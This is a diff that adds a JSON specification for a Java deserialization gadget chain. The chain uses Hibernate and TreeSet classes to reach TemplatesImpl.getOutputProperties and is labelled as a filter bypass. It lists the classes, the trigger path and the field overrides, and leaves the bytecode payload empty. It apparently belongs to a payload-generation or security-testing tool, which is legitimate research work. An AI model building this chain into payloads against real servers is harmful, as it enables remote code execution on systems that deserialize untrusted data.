@@ -1,0 +1,37 @@
+{
+    "chain_type": "Hibernate3_TreeSet — TreeSet + Comparator proxy → TypedValue/ComponentType → GetterMethodImpl → TemplatesImpl (filter-bypass)",
+    "root_class": "java.util.TreeSet",
+    "root_trigger": "readObject→TreeMap.put→Comparator.compare→TypedValue.hashCode→ComponentType.getHashCode→getter.invoke",
+    "links": [
+        {
+            "class": "org.hibernate.engine.spi.TypedValue",
+            "field_overrides": {
+                "type": {"$ref": "link:1"},
+                "value": {"$ref": "link:2"}
+            }
+        },
+        {
+            "class": "org.hibernate.type.ComponentType",
+            "field_overrides": {
+                "propertyTypes": [{"$ref": "link:3"}],
+                "propertySpan": 1
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        },
+        {
+            "class": "org.hibernate.property.access.spi.GetterMethodImpl",
+            "field_overrides": {
+                "containerClass": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+                "propertyName": "outputProperties"
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
